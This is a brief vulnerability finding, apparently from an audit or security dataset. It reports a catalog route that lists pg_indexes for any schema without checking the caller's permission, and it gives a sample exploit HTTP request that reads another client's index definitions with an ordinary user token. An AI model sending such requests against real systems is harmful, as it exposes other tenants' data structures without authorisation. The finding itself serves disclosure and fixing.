diagnosis: The catalog route queries pg_indexes for all table indices in schema_id. It fails to confirm that current_user is permitted to access schema_id, allowing any authenticated user to inspect database indexing strategies, unique constraint definitions, and internal table structures belonging to other client schemas.
exploit_request:
GET /catalog/schemas/client_healthcare_corp/indexes HTTP/1.1
Host: catalog.bi.internal
Authorization: Bearer <standard_user_token>
